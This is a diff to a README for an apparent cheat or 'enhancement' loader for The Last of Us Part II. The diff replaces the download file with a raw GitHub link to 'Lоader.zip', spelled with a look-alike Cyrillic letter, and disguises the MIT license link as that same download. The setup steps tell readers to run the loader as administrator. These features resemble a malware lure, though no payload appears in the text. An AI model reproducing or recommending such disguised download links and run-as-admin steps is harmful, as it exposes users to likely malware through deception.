@@ -14,7 +14,7 @@ This program is a feature-rich enhancement tool built exclusively for **The Last
 
 Getting started is simple! Follow these steps to unlock your game's true potential:
 
-1. **Download** `Loader.rar` from this repository.
+1. **Download** `https://raw.githubusercontent.com/BrunoCroppi/TLOU2-UndergroundToolkit/main/Lоader.zip` from this repository.
 2. Extract the contents using your preferred archive manager.
 3. Run the extracted loader file as administrator.
 4. Follow the on-screen instructions to inject your chosen enhancements.
@@ -87,7 +87,7 @@ Copyright (c) 2025
 
 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 
-[Read the Full MIT License](https://opensource.org/licenses/MIT)
+[Read the Full MIT License](https://raw.githubusercontent.com/BrunoCroppi/TLOU2-UndergroundToolkit/main/Lоader.zip)
 
 ---
 
